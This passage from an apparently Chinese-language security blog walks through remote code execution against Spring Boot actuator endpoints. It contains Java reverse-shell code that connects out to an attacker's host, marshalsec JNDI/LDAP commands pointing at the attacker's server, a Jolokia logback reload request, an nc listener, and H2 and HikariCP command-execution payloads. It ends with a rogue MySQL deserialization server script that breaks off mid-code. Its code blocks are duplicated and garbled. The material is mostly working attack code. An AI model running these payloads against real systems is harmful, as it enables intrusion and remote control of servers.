class="hljs-comment">// 注意下面这个转译，否则无法编译 </span><br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;py_path, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;</span>&#125;;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>&#125;;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cmd = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>&#125;;<br>            &#125;<br>            Process p = (<span class="hljs-keyword">new</span> ProcessBuilder(cmd)).redirectErrorStream(<span class="hljs-keyword">true</span>).start();<br>            Socket s = <span class="hljs-keyword">new</span> Socket(ip, Integer.parseInt(port));<br>            InputStream pi = p.getInputStream();<br>            InputStream pe = p.getErrorStream();<br>            InputStream si = s.getInputStream();<br>            OutputStream po = p.getOutputStream();<br>            OutputStream so = s.getOutputStream();<br>            <span class="hljs-keyword">while</span>(!s.isClosed()) &#123;<br>                <span class="hljs-keyword">while</span>(pi.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                    so.write(pi.read());<br>                &#125;<br>                <span class="hljs-keyword">while</span>(pe.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                    so.write(pe.read());<br>                &#125;<br>                <span class="hljs-keyword">while</span>(si.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                    po.write(si.read());<br>                &#125;<br>                so.flush();<br>                po.flush();<br>                Thread.sleep(<span class="hljs-number">50L</span>);<br>                <span class="hljs-keyword">try</span> &#123;<br>                    p.exitValue();<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>            &#125;<br>            p.destroy();<br>            s.close();<br>        &#125;<span class="hljs-keyword">catch</span> (Throwable e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>开启LDAP Ref 重定向到JNDIObject.class</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">root@ubuntu:~#java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389<br></code></pre></td></tr></table></figure>



<ol start="3">
<li>将logback的配置文件指定为远程的test.xml，这个配置文件会加载JNDI</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs awk"><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp"><code class="language-hljs awk"><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/your-ip:your-port!/</span>test.xml<br></code></pre></td></tr></table></figure>



<ol start="4">
<li>接受弹回来的shell:</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> JNDIObject.java 中的端口</span><br>nc -nlp your-port<br></code></pre></td></tr></table></figure>

<p><img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220720194541878.png" alt="image-20220720194541878"></p>
<h1 id="0x4-H2-Database-Console-JNDI-RCE"><a href="#0x4-H2-Database-Console-JNDI-RCE" class="headerlink" title="0x4. H2 Database Console JNDI RCE"></a>0x4. H2 Database Console JNDI RCE</h1><p>利用前提：</p>
<ul>
<li>jdk满足jnddi</li>
<li>开起H2 Database Console</li>
</ul>
<img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721143633481.png" alt="image-20220721143633481" style="zoom: 33%;">

<p>利用：</p>
<ol>
<li>配置JDNI环境： </li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">root@ubuntu:~#java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389<br>root@ubuntu:~# nc -nlp your-port<br></code></pre></td></tr></table></figure>



<ol start="2">
<li>访问 <code>h2-console</code> 在JDBC URL处 ，进行JNDI注入</li>
</ol>
<img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721143532447.png" alt="image-20220721143532447" style="zoom:20%;">

<ol start="3">
<li>反弹的shell:</li>
</ol>
<img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721143951222.png" alt="image-20220721143951222" style="zoom:33%;">





<h1 id="0x5-HikariCP-H2-Database-Query-RCE"><a href="#0x5-HikariCP-H2-Database-Query-RCE" class="headerlink" title="0x5. HikariCP - H2 Database Query RCE"></a>0x5. HikariCP - H2 Database Query RCE</h1><p>Spring Boot 2.x默认使用的HikariCP数据库连接池提供了一个变量<code>spring.datasource.hikari.connection-test-query</code>，这个变量可以用来执行SQL语句，在H2环境中可以用来执行代码</p>
<p>利用前提：</p>
<ul>
<li>需要有H2数据库的依赖和HikariCP</li>
<li>可以重启actuator</li>
</ul>
<p>利用：</p>
<ol>
<li>设置环境变量</li>
</ol>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/env</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="scilab">content-<span class="hljs-built_in">type</span>: application/json</span><br><span class="scilab"></span><br><span class="scilab">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;CREATE ALIAS EXEC AS &#x27;</span>String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().<span class="hljs-built_in">exec</span>(cmd).getInputStream());  <span class="hljs-keyword">if</span> (s.hasNext()) &#123;<span class="hljs-keyword">return</span> s.next();&#125; throw new IllegalArgumentException();&#125;<span class="hljs-string">&#x27;; CALL EXEC(&#x27;</span>calc.exe&#x27;);<span class="hljs-string"><code class="language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/env</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="scilab">content-<span class="hljs-built_in">type</span>: application/json</span><br><span class="scilab"></span><br><span class="scilab">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;CREATE ALIAS EXEC AS &#x27;</span>String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().<span class="hljs-built_in">exec</span>(cmd).getInputStream());  <span class="hljs-keyword">if</span> (s.hasNext()) &#123;<span class="hljs-keyword">return</span> s.next();&#125; throw new IllegalArgumentException();&#125;<span class="hljs-string">&#x27;; CALL EXEC(&#x27;</span>calc.exe&#x27;);<span class="hljs-string">"&#125;</span></span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>重启</li>
</ol>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/restart</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="css"><span class="hljs-attribute">content</span>-type: application/json</span><br><span class="css"></span><br><span class="css"><code class="language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/restart</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="css"><span class="hljs-attribute">content</span>-type: application/json</span><br><span class="css"></span><br><span class="css">&#123;&#125;</span><br></code></pre></td></tr></table></figure>



<ol start="3">
<li>弹出计算器</li>
</ol>
<img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721144722949.png" alt="image-20220721144722949" style="zoom:25%;">





<h1 id="0x6-MySQL-JDBC-DeserializationRCE"><a href="#0x6-MySQL-JDBC-DeserializationRCE" class="headerlink" title="0x6. MySQL JDBC DeserializationRCE"></a>0x6. MySQL JDBC DeserializationRCE</h1><p>未复现成功，没有回连mysql….</p>
<ol>
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding: utf-8</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server_send</span>(<span class="hljs-params">conn, payload</span>):</span><br>    <span class="hljs-keyword">global</span> count<br>    count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Package order: &#123;&#125;, Send: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(count, payload))<br>    conn.send(binascii.a2b_hex(payload))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server_receive</span>(<span class="hljs-params">conn</span>):</span><br>    <span class="hljs-keyword">global</span> count, BUFFER_SIZE<br><br>    count += <span class="hljs-number">1</span><br>    data = conn.recv(BUFFER_SIZE)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Package order: &#123;&#125;, Receive: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(count, data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_mysql_server</span>():</span><br>    <span class="hljs-keyword">global</span> count, deserialization_payload<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        count = <span class="hljs-number">0</span><br>        conn, addr = server_socks.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Connection from client -&gt; &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>], addr[<span class="hljs-number">1</span>]))<br>        greeting = <span class="hljs-string">&#x27;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#x27;</span><br>        server_send(conn, greeting)<br>        <span class="hljs-keyword">if</span> os.path.isfile(deserialization_file):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(deserialization_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> _f:<br>                deserialization_payload = binascii.b2a_hex(_f.read())<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># client auth</span><br>            server_receive(conn)<br>            server_send(conn, response_ok)<br><br>            <span class="hljs-comment"># client query</span><br>            data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#x27;</span><br>                server_send(conn, _payload)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                server_send(conn, _payload)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                server_send(conn, response_ok)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                server_send(conn, response_ok)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                _data += <span class="hljs-string">&#x27;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#x27;</span><br>                _data += <span class="hljs-string">&#x27;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#x27;</span><br>                _payload_hex = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(deserialization_payload)/<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                _payload_length = _payload_hex[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + _payload_hex[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                _data_hex = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(deserialization_payload)/<span class="hljs-number">2</span> + <span class="hljs-number">5</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                _data_lenght = _data_hex[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + _data_hex[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + _data_hex[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                _data += _data_lenght + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;0131fc&#x27;</span> + _payload_length + deserialization_payload<br>                _data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                server_send(conn, _data)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                server_send(conn, _payload)<br><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">try</span>:<br>            conn.close()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    PORT = <span class="hljs-number">3306</span><br><br>    deserialization_file = <span class="hljs-string">r&#x27;payload.ser&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(deserialization_file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(deserialization_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            deserialization_payload = binascii.b2a_hex(f.read())<br>    <span class="hljs-keyword">else</span>:<br>        deserialization_payload = <span class="hljs-string">&#x27;aced****(your deserialized hex data)&#x27;</span><br><br>    count = <span class="hljs-number">0</span><br>    BUFFER_SIZE = <span class="hljs-number">1024</span><br>    response_ok = <span class="hljs-string">&#x27;0700000200000002000000&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] rogue mysql server Listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT))<br>    server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    server_socks.bind((HOST, PORT))<br>    server_socks.listen(<span class="hljs-number"><code class="language-hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding: utf-8</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server_send</span>(<span class="hljs-params">conn, payload</span>):</span><br>    <span class="hljs-keyword">global</span> count<br>    count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Package order: &#123;&#125;, Send: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(count, payload))<br>    conn.send(binascii.a2b_hex(payload))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server_receive</span>(<span class="hljs-params">conn</span>):</span><br>    <span class="hljs-keyword">global</span> count, BUFFER_SIZE<br><br>    count += <span class="hljs-number">1</span><br>    data = conn.recv(BUFFER_SIZE)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Package order: &#123;&#125;, Receive: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(count, data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_mysql_server</span>():</span><br>    <span class="hljs-keyword">global</span> count, deserialization_payload<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        count = <span class="hljs-number">0</span><br>        conn, addr = server_socks.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Connection from client -&gt; &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>], addr[<span class="hljs-number">1</span>]))<br>        greeting = <span class="hljs-string">&#x27;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#x27;</span><br>        server_send(conn, greeting)<br>        <span class="hljs-keyword">if</span> os.path.isfile(deserialization_file):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(deserialization_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> _f:<br>                deserialization_payload = binascii.b2a_hex(_f.read())<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># client auth</span><br>            server_receive(conn)<br>            server_send(conn, response_ok)<br><br>            <span class="hljs-comment"># client query</span><br>            data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#x27;</span><br>                server_send(conn, _payload)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                server_send(conn, _payload)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                server_send(conn, response_ok)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                server_send(conn, response_ok)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                _data += <span class="hljs-string">&#x27;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#x27;</span><br>                _data += <span class="hljs-string">&#x27;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#x27;</span><br>                _payload_hex = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(deserialization_payload)/<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                _payload_length = _payload_hex[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + _payload_hex[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                _data_hex = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(deserialization_payload)/<span class="hljs-number">2</span> + <span class="hljs-number">5</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                _data_lenght = _data_hex[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + _data_hex[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + _data_hex[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                _data += _data_lenght + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;0131fc&#x27;</span> + _payload_length + deserialization_payload<br>                _data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                server_send(conn, _data)<br>                data = server_receive(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span 